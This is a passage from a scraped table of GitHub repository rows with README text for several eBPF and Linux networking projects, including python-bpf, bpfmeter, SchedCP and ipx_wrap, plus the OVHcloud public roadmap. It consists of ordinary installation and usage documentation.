   - The Grafana dashboard uses LogQL queries
   - Installation instructions: [Loki Documentation](https://grafana.com/docs/loki/latest/setup/install/)

> The way it works is very straightforward: it uses the hubble container image which connects to the hubble relay and sends all flows to the stdout. Thats why you need a log collector which ships the logs to Loki.

## Installation

```bash
helm upgrade --install hubble-observer oci://ghcr.io/onzack/hubble-observer:<VERSION>
```

## Configuration

See `values.yaml` for configuration options. "
varun-r-mallya/python-bpf,149,3,149,20,Python,Python Frontend to LLVM IR for eBPF programs in Pure Python,2025-08-30T13:22:44Z,2025-10-12T19:07:04Z,449,"<picture>
  <source
    media=""(prefers-color-scheme: light)""
    srcset=""https://github.com/user-attachments/assets/f3738131-d7cb-4b5c-8699-c7010295a159""
    width=""450""
    alt=""Lightâ€mode image"">
  <img
    src=""https://github.com/user-attachments/assets/b175bf39-23cb-475d-a6e1-7b5c99a1ed72""
    width=""450""
    alt=""Darkâ€mode image"">
</picture>
<!-- Badges -->
<p align=""center"">
  <!-- PyPI -->
  <a href=""https://pypi.org/project/pythonbpf/""><img src=""https://img.shields.io/pypi/v/pythonbpf?color=blue"" alt=""PyPI version""></a>
  <!-- <a href=""https://pypi.org/project/pythonbpf/""><img src=""https://img.shields.io/pypi/pyversions/pythonbpf"" alt=""Python versions""></a> -->
  <!-- <a href=""https://pypi.org/project/pythonbpf/""><img src=""https://img.shields.io/pypi/dm/pythonbpf"" alt=""PyPI downloads""></a> -->
  <!-- <a href=""https://pypi.org/project/pythonbpf/""><img src=""https://img.shields.io/pypi/status/pythonbpf"" alt=""PyPI Status""></a> -->
  <a href=""https://pepy.tech/project/pythonbpf""><img src=""https://pepy.tech/badge/pythonbpf"" alt=""Downloads""></a>
  <!-- Build & CI -->
  <a href=""https://github.com/pythonbpf/python-bpf/actions""><img src=""https://github.com/pythonbpf/python-bpf/actions/workflows/python-publish.yml/badge.svg"" alt=""Build Status""></a>
  <!-- Meta -->
  <a href=""https://github.com/pythonbpf/python-bpf/blob/main/LICENSE""><img src=""https://img.shields.io/github/license/pythonbpf/python-bpf"" alt=""License""></a>
</p>


Python-BPF is an LLVM IR generator for eBPF programs written in Python. It uses [llvmlite](https://github.com/numba/llvmlite) to generate LLVM IR and then compiles to LLVM object files. These object files can be loaded into the kernel for execution. Python-BPF performs compilation without relying on BCC.

> **Note**: This project is under active development and not ready for production use.

---

## Overview

* Generate eBPF programs directly from Python.
* Compile to LLVM object files for kernel execution.
* Built with `llvmlite` for IR generation.
* Supports maps, helpers, and global definitions for BPF.
* Companion project: [pylibbpf](https://github.com/pythonbpf/pylibbpf), which provides the bindings required for object loading and execution.

---

## Installation

Dependencies:

* `clang`
* Python â‰¥ 3.8

Install via pip:

```bash
pip install pythonbpf pylibbpf
```

---

## Example Usage

```python
import time
from pythonbpf import bpf, map, section, bpfglobal, BPF
from pythonbpf.helper import pid
from pythonbpf.maps import HashMap
from pylibbpf import *
from ctypes import c_void_p, c_int64, c_uint64, c_int32
import matplotlib.pyplot as plt


# This program attaches an eBPF tracepoint to sys_enter_clone,
# counts per-PID clone syscalls, stores them in a hash map,
# and then plots the distribution as a histogram using matplotlib.
# It provides a quick view of process creation activity over 10 seconds.

@bpf
@map
def hist() -> HashMap:
    return HashMap(key=c_int32, value=c_uint64, max_entries=4096)


@bpf
@section(""tracepoint/syscalls/sys_enter_clone"")
def hello(ctx: c_void_p) -> c_int64:
    process_id = pid()
    one = 1
    prev = hist.lookup(process_id)
    if prev:
        previous_value = prev + 1
        print(f""count: {previous_value} with {process_id}"")
        hist.update(process_id, previous_value)
        return c_int64(0)
    else:
        hist.update(process_id, one)
    return c_int64(0)


@bpf
@bpfglobal
def LICENSE() -> str:
    return ""GPL""


b = BPF()
b.load_and_attach()
hist = BpfMap(b, hist)
print(""Recording"")
time.sleep(10)

counts = list(hist.values())

plt.hist(counts, bins=20)
plt.xlabel(""Clone calls per PID"")
plt.ylabel(""Frequency"")
plt.title(""Syscall clone counts"")
plt.show()
```
---

## Architecture

Python-BPF provides a complete pipeline to write, compile, and load eBPF programs in Python:

1. **Python Source Code**

   * Users write BPF programs in Python using decorators like `@bpf`, `@map`, `@section`, and `@bpfglobal`.
   * Maps (hash maps), helpers (e.g., `ktime`, `deref`), and tracepoints are defined using Python constructs, preserving a syntax close to standard Python.

2. **AST Generation**

   * The Python `ast` module parses the source code into an Abstract Syntax Tree (AST).
   * Decorators and type annotations are captured to determine BPF maps, tracepoints, and global variables.

3. **LLVM IR Emission**

   * The AST is transformed into LLVM Intermediate Representation (IR) using `llvmlite`.
   * IR captures BPF maps, control flow, assignments, and calls to helper functions.
   * Debug information is emitted for easier inspection.

4. **LLVM Object File Compilation**

   * The LLVM IR (`.ll`) is compiled into a BPF target object file (`.o`) using `llc -march=bpf -O2`.
   * This produces a kernel-loadable ELF object file containing the BPF bytecode.

5. **libbpf Integration (via pylibbpf)**

   * The compiled object file can be loaded into the kernel using `pylibbpf`.
   * Maps, tracepoints, and program sections are initialized, and helper functions are resolved.
   * Programs are attached to kernel hooks (e.g., syscalls) for execution.

6. **Execution in Kernel**

   * The kernel executes the loaded eBPF program.
   * Hash maps, helpers, and global variables behave as defined in the Python source.
   * Output can be read via BPF maps, helper functions, or trace printing.

This architecture eliminates the need for embedding C code in Python, allowing full Python tooling support while generating true BPF object files ready for kernel execution.

---

## Development

1. Create a virtual environment and activate it:

   ```bash
   python3 -m venv .venv
   source .venv/bin/activate
   ```

2. Install dependencies:

   ```bash
   make install
   ```
   Then, run any example in `examples`
3. Verify an object file with the kernel verifier:

   ```bash
   ./tools/check.sh check execve2.o
   ```

5. Run an object file using `bpftool`:

   ```bash
   ./tools/check.sh run execve2.o
   ```

6. Explore LLVM IR output from clang in `examples/c-form` by running `make`.

---

## Resources

* [Video demonstration](https://youtu.be/eMyLW8iWbks)
* [Slide deck](https://docs.google.com/presentation/d/1DsWDIVrpJhM4RgOETO9VWqUtEHo3-c7XIWmNpi6sTSo/edit?usp=sharing)

---

## Authors

* [@r41k0u](https://github.com/r41k0u)
* [@varun-r-mallya](https://github.com/varun-r-mallya)

---
"
ovh/public-cloud-roadmap,197,6,197,399,,"Agile roadmap for OVHcloud Public Cloud services. Discover the features our product teams are working on,  comment and influence our backlog.",2020-10-22T08:02:43Z,2025-10-03T11:52:41Z,49,"# OVHcloud Cloud Roadmap and Changelog - Public Cloud issues

## Consulting roadmap and changelog
OVHcloud now exposes a [central public roadmap and changelog for all its Cloud services as a GitHub Project](https://github.com/orgs/ovh/projects/16).
This includes a detailed view for our Public Cloud IAAS, container and data services, additionnaly to transversal security, identity and operations services.

[ âœ… View Changelog](https://github.com/orgs/ovh/projects/16/views/6) or [ ðŸ“… View Roadmap](https://github.com/orgs/ovh/projects/16/views/1)

- You can **subscribe to a given issue** to get email notifications when the feature is updated or moves forward
- You can **comment or vote** for listed features to influence our specifications and prioritization

## Proposing a new feature
- Consider only new features (aka functional enhancements, new localizations, UX improvments). Specific bug reports or support requests should be opened through  [the OVHcloud help center](https://help.ovhcloud.com/en-ie/ ""the OVHcloud help center"")
- If you believe you've found a security issue in our service, please enter our [bug bounty programm ](https://yeswehack.com/programs/ovh#rules ""bug bounty programm "")
- Please consult [Existing issues](https://github.com/ovh/public-cloud-roadmap/issues ""Existing issues"") and [product documentation](https://help.ovhcloud.com/csm/en-gb-documentation?id=kb_home ""product documentation"") to avoid duplicates
- Please describe the feature in the shortest possible way, ideally as an agile user story.
- We are interested in your use case associated and the current workaround you have found if they exist. Please comment your own issue with those details if possible.

[ ðŸ†• Propose a new feature request - aka issue for Public Cloud](https://github.com/ovh/public-cloud-roadmap/issues/new?assignees=&labels=&projects=&template=feature_request.md&title=)

Note : you can also create issues [regarding infrastructure products external to our Public Cloud ecosystem here](https://github.com/ovh/infrastructure-roadmap/issues/new)    [regarding Hosted Private Cloud here ](https://github.com/ovh/private-cloud-roadmap/issues/new) or [regarding Security, Identity and Operations here ](https://github.com/ovh/management-security-operations-roadmap/issues/new)

## Notes/Disclaimer
- New issues will be considered typically within a week and may be marked as **Aknowledged** if they align with our product strategy.
- We regularly commit to new items on the backlog. ""**Prioritized**"" column means that the feature has been sized and is planned for the **next 3 to 12 months**
- When these elements approach production, they are moved to ""**Planned**"". At that stage, specification are final, and the feature will be release usually in less than **3 months**
- We will keep new features for a couple of months after their release in the ""**Done**"" column for follow-up. Note that most feature may also be considered ""**Partially released**"" if they are accessible under beta terms and/or miss UI or Terraform integration for example.
- This public roadmap is purely indicative, and we may surprise you with additionnal strategic feature that we choose to keep confidential for some reasons.
- We may delete any inappropriate content at any time.
"
trndcenter/bpfmeter,16,1,16,0,Rust,Performance monitoring agent for eBPF programs,2025-09-01T12:35:25Z,2025-10-10T12:07:02Z,33,"# Bpfmeter

Bpfmeter is a tool for measuring the performance of eBPF programs. It enables CPU load measurement, supports local execution, stores data into CSV files, and implements a Prometheus client for exporting metrics to monitoring systems.

## Quick start

### Run locally

To run the agent:

```shell
$ bpfmeter run -o outdir/
```

The arguments specify the measurement period and the output directory where CSV files will be saved once the agent is stopped. By default, the tool starts monitoring all loaded eBPF programs. Users can specify particular eBPF program IDs using the `-p` option to track specific instances.

Example of a generated CSV:

```csv
exact_cpu_usage,run_time,run_count
0.0037179608,0.017889192,182679
0.0026831191,0.020577219,212503
0.0028221705,0.023404128,235003
0.004331591,0.027743375,293565
0.0044721225,0.03222083,348499
```

Each row contains the percentage of CPU usage, processor time spent by the eBPF program, and the number of its executions during the specified time intervals.

To visualize the collected data you need to install pkg-config, libfreetype-dev, and libfontconfig1-dev packages and run command:

```bash
$ bpfmeter draw -i outdir/ -o svgdir/
```

The resulting plot(s) will be saved in the `svgdir` directory. Example:

![plot](docs/images/bpf_programs_cpu_usage.svg)

### Container installation

You can deploy bpfmeter as a container. Choose the desired version and pull the image:

```shell
$ docker pull ghcr.io/trndcenter/bpfmeter:v0.1.0
```

and run the agent:

```shell
$ docker run --rm -it --cap-add=CAP_SYS_ADMIN ghcr.io/trndcenter/bpfmeter:v0.1.0 run -o outdir/
```

### Kubernetes installation

It is also possible to use bpfmeter in your Kubernetes cluster by applying the provided manifest:

```shell
$ kubectl apply -f install/kubernetes/bpfmeter-agent.yaml
```

For advanced Kubernetes manifest management, refer to the [installation documentation](install/kubernetes).

### Prometheus exporter

The agent implements a Prometheus client interface to export metrics in OpenMetrics format to monitoring systems. If the agent was built using the container image, it can be launched as follows:

```shell
$ docker run --rm -it -p 9100:9100 --cap-add=CAP_SYS_ADMIN ghcr.io/trndcenter/bpfmeter:v0.1.0 run --labels system=bpfmeter -P 9100
```

If no output directory is specified, the agent automatically starts the Prometheus client on the given port. Along with CPU usage metrics, the labels provided in the command-line arguments will be sent.

The collected metrics can be scraped or forwarded via the Remote Write protocol. Example using [Victoria Metrics](https://github.com/VictoriaMetrics/VictoriaMetrics) agent:

```bash
$ vmagent -promscrape.config=config.yaml -remoteWrite.url=<RemoteWriteEndpoint> -remoteWrite.bearerToken=<API_TOKEN> -remoteWrite.flushInterval=30s
```

Example `config.yaml`:

```yaml
global:
  scrape_interval: 30s
scrape_configs:
   - job_name: 'prometheus'
     static_configs:
       - targets: ['127.0.0.1:9100']
         labels:
           instance: 'localhost'
     sample_limit: 10
     label_limit: 30
```

You can also use the [Vector](https://github.com/vectordotdev/vector) agent with config:

```yaml
role: ""Agent""

customConfig:
  data_dir: /vector-data-dir
  api:
    enabled: true
    address: 127.0.0.1:8686
    playground: false
  sources:
    prometheus_metrics:
      type: prometheus_scrape
      endpoints:
        - 127.0.0.1:9100/metrics
      scrape_interval: 30
  sinks:
    remote_write_metrics:
      type: prometheus_remote_write
      inputs: [""prometheus_metrics""]
      endpoint: ""<RemoteWriteEndpoint>""
```

## Development

To build the project, Rust should be installed. Installation instructions can be found [here](https://www.rust-lang.org/tools/install). The tool supports generating various plots by default, which requires the pkg-config, libfreetype-dev, and libfontconfig1-dev packages. On Ubuntu, they can be installed via apt:

```bash
$ apt install pkg-config libfreetype-dev libfontconfig1-dev
```

Run local build:

```bash
$ just build
```

If plot rendering features are not needed:

```bash
$ just build-minimized
```

Apply linter and formatter with:

```shell
$ just lint && just fmt
```

For running tests you need to install [bpftrace](https://github.com/bpftrace/bpftrace) and add it to the `PATH` environment variable. It is also important to have `CAP_SYS_ADMIN` capability for testing. You can start tests with following command:

```bash
$ sudo -E env ""PATH=$PATH"" just test
```

You could also build a container with the tool ([Dockerfile](Dockerfile)):

```bash
$ docker build . -t bpfmeter
```

"
eunomia-bpf/schedcp,38,4,38,1,C,MCP Server for Linux Scheduler Management and Auto optimization,2025-07-06T12:49:42Z,2025-10-09T01:50:24Z,266,"# SchedCP - Automatically Optimize Linux Scheduler with MCP Server

> WIP: We are building a benchmark for evaluating the optimizations for OS!

SchedCP is an `experimental` project that enables AI optimization of Linux kernel schedulers using the sched-ext framework. It provides e2e automatic scheduler selection/synthesis, workload profiling, and performance optimization without any human intervention or guidance.

Paper: [SchedCP: Towards Agentic OS](https://arxiv.org/abs/2509.18256)

*The future is not just about letting AI write code for you; the AI agent should act as your system administrator, able to optimize anything for you automatically, without requiring any manual intervention!*

It includes the following tools:

- **autotune** - AI Agent-powered automatic OS optimization
- **schedcp** - MCP server for scheduler management and generation

## Demo

Start optimize any workload with AI by simply run:

```sh
autotune/target/release/autotune cc ""<your workload command>""
# example for linux build
autotune/target/release/autotune cc ""make -C workloads/linux-build-bench/linux clean -j && make -C workloads/linux-build-bench/linux -j"" 
# example for schbench
autotune/target/release/autotune cc  workloads/basic/schbench/schbench
```

Allow LLM Agent to auto select and config the best scheduler:

![document/schbench-optimize.gif](https://github.com/eunomia-bpf/schedcp/blob/master/document/schbench-optimize.gif?raw=true)

Allow LLM Agents to write new schedulers:

## Features & design

- Automatic workload profiling
- Automatic scheduler selection based on workload characteristics
- Performance tracking across different schedulers
- Real-time scheduler management and generation

![document/design.png](https://github.com/eunomia-bpf/schedcp/blob/master/document/design.png?raw=true)

The current MCP tools include:

- **list_schedulers** - Get detailed information about all available schedulers
- **run_scheduler** - Start schedulers with custom configurations
- **stop_scheduler** - Stop running scheduler instances
- **get_execution_status** - Monitor scheduler performance and output
- **create_and_verify_scheduler** - Create custom BPF schedulers from source code
- **system_monitor** - Collect real-time CPU, memory, and scheduler metrics
- **workload** - Manage workload profiles and execution history

## Installation

### Requirements

- Linux kernel 6.12+ with sched-ext support  
- Rust toolchain

The major dependencies are the dependencies for the sched-ext framework. You can check the [github.com/sched-ext/scx](https://github.com/sched-ext/scx) for more details.

You also need to install the deps for the workloads you want to optimize.

### Build

```bash
# Clone with submodules
git clone https://github.com/eunomia-bpf/schedcp
cd schedcp
git submodule update --init --recursive scheduler/scx

# Build schedulers
cd scheduler && make && make install && cd ..
# Build autotune
cd autotune && cargo build --release && cd ..
# Build MCP server
cd mcp && cargo build --release && cd ..
```

## Usage

**You should run the claude-code on project root directory.**

### Autotune (Recommended)

```bash
# Set sudo password
export SCHEDCP_SUDO_PASSWORD=""your_password""

# Optimize any workload
./autotune/target/release/autotune cc ""<your workload command>""
```

### MCP Server

check the [.mcp.json](https://github.com/eunomia-bpf/schedcp/blob/master/.mcp.json) for more details. You can just open the claude-code on the 

### CLI Tool

```bash
export SCHEDCP_SUDO_PASSWORD=""your_password""

# List schedulers
./mcp/target/release/schedcp-cli list

# Run a scheduler
./mcp/target/release/schedcp-cli run scx_rusty --sudo

# Check status
./mcp/target/release/schedcp-cli status
```

## Related Projects

- [sched-ext](https://github.com/sched-ext/scx) - Linux kernel BPF scheduler framework
- [Model Context Protocol](https://modelcontextprotocol.io/) - AI-application integration protocol

## License

See [LICENSE](https://github.com/eunomia-bpf/schedcp/blob/master/LICENSE) for details.
"
twisted-pear/ipx_wrap,5,0,5,0,C,A joke IPX implementation for Linux using eBPF.,2025-03-30T01:16:57Z,2025-10-12T15:01:46Z,202,"# ipx_wrap

The idea is that IPv6 packets that are sent are turned into IPX packets on the
wire and IPX packets that are received are turned into IPv6 packets that can be
routed by the IPv6 network stack.

To rewrite the packets there are two BPF programs. To configure them there is a
simple command-line utility (`ipx_wrap_if_config`).

To allow transmission and reception of IPX traffic from and to the local
machine there is `ipx_wrap_mux`. This program, once started, can be utilized by
client programs to bind to IPX sockets and transmit IPX packets.

To propagate routes to real IPX hosts there is `ipx_wrap_ripd`. To advertise
services on the IPX internetwork there is `ipx_wrap_sapd`.

This most likely only works with a recent Linux kernel. Tested with Linux 6.15
and libbpf 1.4.6.

## Warning!

This is highly experimental and has only been sporadically tested against
NetWare 6.5. It will have bugs or exhibit unexpected behavior.

## BPF programs

There are two BPF programs for the TC hook. One for egress, one for ingress.
On egress IPv6 packets sent within the set prefix are changed into IPX packets.
On ingress IPX packets are changed into IPv6 packets with the source and
destination addresses within the set prefix.

### Interface Configuration

IPX addresses are of the form `<4 byte hex network>.<6 byte hex node number>.<2
byte hex socket>`. The node number is identical to the interface's MAC address
(but without the `:`).

Since an interface cannot have an IPX address assigned directly, a specially
formatted IPv6 address is used instead. To construct this IPv6 address the node
portion of the IPX address is converted into EUI-64 format and used as the
second half of the IPv6 address. Bytes 5-8 of the IPv6 address contain the IPX
network. Bytes 1-4 of the IPv6 address are an arbitrarily chosen prefix that
signifies that the address is an IPX address.  The IPX socket number is not
part of the IPv6 address and is instead used to determine which program on the
host is addressed.

So to put an interface with MAC address `00:11:22:33:44:55` into IPX network
`0xdeadcafe`, you would assign it an address of the form `<32-bit
prefix>:dead:cafe:0011:22ff:fe33:4455`.

Conversely to obtain an IPX address for an interface, we can use bytes 5-8 of
the assigned IPv6 address within the 32-bit prefix as the network number and
the MAC address as the node number. The socket number is dependent on the
addressed program and is therefore not part of any interface address.

For example, if the 32-bit prefix is `0xfdaabbbb` and the interface has the MAC
address `00:11:22:33:44:55` and the IPv6 address
`fdaa:bbbb:dead:cafe:0011:22ff:fe33:4455`, then any IPX address for the
interface will be of the form `deadcafe.001122334455.XXXX`, with XXXX being the
socket number.

### Neighbor Discovery

Neighbor solicitations sent by the configured interface will be intercepted,
modified into an appropriate neighbor advertisement and sent back to the
interface. This is possible because the MAC address is always part of the IPX
address.

### Packet Conversion

There are two ways packets are converted between IPX and IPv6. The first is
intended to carry arbitrary IPv6 traffic over IPX. Here both the source and
destination IPX socket numbers have a value of `(0xd6 << 8) | <next header>`.
The IPX packet type is `0x1f`. On ingress, if both socket numbers have `0xd6`
in their most significant bit and the packet type is `0x1f`, the IPX header is
directly translated into an IPv6 header and the payload of the IPX packet is
appended to that IPv6 header. On egress, any IPv6 packet that is not a UDP
packet with source and destination port equal to `213` has its IPv6 header
converted into an IPX header and its payload is appended to that IPX header.

The second way to convert packets is intended to allow for routing of native
IPX traffic. On ingress the entire IPX packet (header + payload) is wrapped in
an IPv6 UDP packet with source and destination port `213`. The IPv6 header is
populated with information from the IPX header. On egress, any IPv6 UDP packet
with source and destination port equal to `213` has the IPv6 and UDP headers
stripped out and the UDP payload is appended directly to the Ethernet header.

Note that the first approach takes up all socket numbers between `0xd600` and
`0xd6ff`. These are ""well-known"" sockets. Since this is not a NetWare
application and what is left of Novell is now owned by OpenText, I have not
contacted anybody to have these sockets reserved. So it is possible that they
clash with existing applications.

### Loading

Load with:
```
tc qdisc add dev <if> clsact
tc filter add dev <if> ingress bpf object-file ipx_wrap_kern.o section tc/ingress direct-action
tc filter add dev <if> egress bpf object-file ipx_wrap_kern.o section tc/egress direct-action
```

Make sure that all the offloading is disabled or else you might get broken
packets:
```
ethtool -K <if> tx off
ethtool -K <if> rx off
ethtool -K <if> generic-segmentation-offload off
ethtool -K <if> scatter-gather off
ethtool -K <if> tx-gso-list off
ethtool -K <if> tx-ipxip4-segmentation off
ethtool -K <if> tx-ipxip6-segmentation off
ethtool -K <if> tx-udp_tnl-segmentation off
ethtool -K <if> tx-udp_tnl-csum-segmentation off
```

Afterwards, you still need to set the prefix and the network number for the BPF
program (see `ipx_wrap_if_config`).

The `install.sh` script will do all three tasks for you.

```
Usage: install.sh <if> <if ipv6 addr>
```

As an alternative to using the `tc` system to load the BPF programs, there is
also `ipx_wrap_ifd`. This program takes the same arguments as the `install.sh`
script but instead starts a process that installs the BPF programs and
configures them (doing the jobs of the `tc` commands and `ipx_wrap_if_config`).
As long as the program is running, the BPF programs remain active. Once the
program is stopped, the BPF programs are unloaded. Note that when using
`ipx_wrap_ifd`, the you will have to disable offloading yourself as described
above.

## ipx_wrap_if_config

Sets a 4 byte prefix and the IPX network number for the BPF programs on one
interface. The second parameter is the IPv6 address of the interface. Prefix
and network number are extracted from the address.

Usage:
```
Usage: ipx_wrap_if_config <if> <if ipv6 addr>
```

## ipx_wrap_ifd

Loads and configures the BPF programs for one interface. As long as the program
is running, the BPF programs remain active. When the program is stopped, the
BPF programs are unloaded. The parameters and their meanings are the same as
for `ipx_wrap_if_config`.

It is crucial that this program is started _after_ `ipx_wrap_mux` for all
participating interfaces. This is necessary to ensure the correct order of BPF
programs.

Usage:
```
Usage: ipx_wrap_ifd <if> <if ipv6 addr>
```

## ipx_wrap_mux

This program offers a simple API that can be used to send and receive native
IPX packets (those wrapped in IPv6 and UDP, see above). The API is specified in
the file `ipx_wrap_mux_proto.h`.

The program will fork off a process for every interface within the specified
prefix. These sub-processes then communicate with client processes and allow
them to send and receive IPX traffic on a given IPX address.

The sockets returned from the API should only be written to and received from
using the functions of the API. However, the sockets are compatible with
`epoll` and similar interfaces.

Sending `SIGHUP` to the process will cause it to scan again for network
interfaces within the specified prefix.

Usage:
```
Usage: ipx_wrap_mux <32-bit hex prefix>
```

## ipx_wrap_ripd

Sends and receives routes on all interfaces within the specified prefix. It
will transmit all known routes within the prefix, except those that are routed
via the same interface it sends from. It will also learn routes it receives and
enter them into the main routing table.

This program depends on a running `ipx_wrap_mux`.

Sending `SIGHUP` to the process will cause it to scan again for network
interfaces within the specified prefix.

Usage:
```
Usage: ipx_wrap_ripd <32-bit hex prefix>
```

## ipx_wrap_sapd

Sends and receives service information using the Service Advertisement Protocol
(SAP). In addition to learning service information from other SAP servers, it
will also advertise the services configured in the configuration file. The
program will listen and send on all interfaces in the specified prefix.

Sending a `SIGUSR1` to the process will cause it to print all services it knows
about to `stdout` in the same format as the configuration file.

This program depends on a running `ipx_wrap_mux`.

Sending `SIGHUP` to the process will cause it to scan again for network
interfaces within the specified prefix.

Usage:
```
Usage: ipx_wrap_sapd <32-bit hex prefix> <cfg file>
```

Config File Format:
```
# IPX_addr                 hops type name
00000001.000000000001.0001 0000 0001 SRV01
00000002.000000000002.0002 0000 0002 SRV02
...
```

## ipx_wrap_pongd

Replies to IPX Ping messages sent to socket `0x9086`

This program depends on a running `ipx_wrap_mux`.

Sending `SIGHUP` to the process will cause it to scan again for network
interfaces within the specified prefix.

Usage:
```
Usage: ipx_wrap_pongd <32-bit hex prefix>
```

## ipxcat

This is a netcat-like program for sending and receiving IPX packets. Both plain
IPX and SPX are supported.

This program depends on a running `ipx_wrap_mux`.

Usage:
```
Usage: ipxcat [-v] [-d <maximum data bytes>] [-t <packet type>] <local IPX address> <remote IPX address>
       ipxcat [-v] -s [-1] [-d <maximum data bytes>] <local IPX address> <remote IPX address>
       ipxcat [-v] -l [-t <packet type>] [-b] [-r] <local IPX address>
       ipxcat [-v] -l -s [-1] [-d <maximum data bytes>] <local IPX address>
```

The IPX addresses are of the form `<4 byte hex network>.<6 byte hex node
number>.<2 byte hex socket>`. For example: `deadcafe.000000000001.f00f`. If the
socket number of the local IPX address is specified as zero, a random dynamic
socket will be chosen.

The `-l` flag puts the program in listening mode. In this mode IPX packets will
be received or SPX connections accepted. A program in listening mode cannot
send data unless it has accepted an SPX connection.

The `-s` flag instructs the program to use SPX. In listening mode, the program
will wait for an incoming SPX connection. Otherwise, it will attempt to connect
to the remote IPX address. As SPX always uses the packet type `0x05`, the `-t`
option is not allowed when using SPX.

The `-b` flag instructs a program in listening mode to also accept broadcast
packets. When not in listening mode or when using SPX this flag is not allowed.

The `-t` option can be used to specify a packet type when SPX is not in use
(`-s` is not present). If no packet type is specified, then a listening process
will accept any packet type while a sending process will use the packet type
`0x1e`.

The `-d` option specifies the maximum amount of bytes of data transmitted per
packet. For SPX this value is ignored and is 534. For SPXII this value must be
between 1 and 65483 (inclusive). For IPX this value must be between 1 and 65497
(inclusive). There is no MTU measurement unless SPXII is in use. This means
that it is up to the user to ensure packets are not too large to be
transmitted. The default for IPX is 534. SPXII will perform a packet size
negotiation. It will gradually reduce the packet size from the specified
maximum down until packets go through. If the `-d` option is not specified it
will start at 534 bytes of data.

The `-1` flag specifies that only SPX version 1 should be used. This version of
SPX does not support packet size negotiation and thus the maximum packet size
when using SPX version 1 is 576 bytes (534 bytes of payload data). If this flag
is not specified, SPXII will be used if the connection peer supports it.

The `-r` flag causes the program to collect receive timestamps for received IPX
packets. This flag is only allowed in IPX listening mode. Timestamps are
displayed on reception only if the `-v` flag is also present.

The `-v` flag will cause the program to print more detailed information to
`stderr`.

## ipxdiag

This is a program for collecting diagnostic information from IPX machines that
support diagnostic services. Messages can be sent to a single target or to a
network's broadcast address. The destination socket to be used is usually
`0x0456`.

Once the program starts, the request message is sent. Then, the program waits
for a certain number of seconds for replies and prints their contents to
`stdout`.

This program depends on a running `ipx_wrap_mux`.

Usage:
```
Usage: ipxdiag [-v] [-t <packet type>] [-w <wait seconds>] [-e <excluded target node> ...] <local IPX addr> <target IPX address>
```

The IPX addresses are of the form `<4 byte hex network>.<6 byte hex node
number>.<2 byte hex socket>`. For example: `deadcafe.000000000001.f00f`. If the
socket number of the local IPX address is specified as zero, a random dynamic
socket will be chosen.

The `-e` option can be used to specify the node address of an IPX machine that
should not reply to our request. This can be useful when sending to a network's
broadcast address to suppress replies from machines on that network that we are
not interested in. The `-e` option can be specified up to 80 times.

The `-t` option can be used to specify a packet type. If no packet type is
specified, then the process will use the packet type `0x1e`.

The `-w` option can be used to specify (in seconds) how long the program will
wait for reply messages. The default is 5 seconds.

The `-v` flag will cause the program to print more detailed information.

## spxinetd

This program allows exposing an executable via SPX. For each incoming SPX
connection, the specified executable will be executed. Its input will be read
from the SPX connection and its output will be written to the SPX connection.

Note that the path to the executable must be an absolute path. Options can be
specified after the path.

This program depends on a running `ipx_wrap_mux`.

Usage:
```
Usage: spxinetd [-v] [-1] [-d <maximum data bytes>] [-e] <local IPX address> -- <command>
```

The IPX addresses are of the form `<4 byte hex network>.<6 byte hex node
number>.<2 byte hex socket>`. For example: `deadcafe.000000000001.f00f`. If the
socket number of the local IPX address is specified as zero, a random dynamic
socket will be chosen.

The `-d` option specifies the maximum amount of bytes of data transmitted per
packet. For SPX this value is ignored and is 534. For SPXII this value must be
between 1 and 65483 (inclusive). SPXII will perform a packet size negotiation.
It will gradually reduce the packet size from the specified maximum down until
packets go through. If the `-d` option is not specified it will start at 534
bytes of data.

The `-1` flag specifies that only SPX version 1 should be used. This version of
SPX does not support packet size negotiation a"
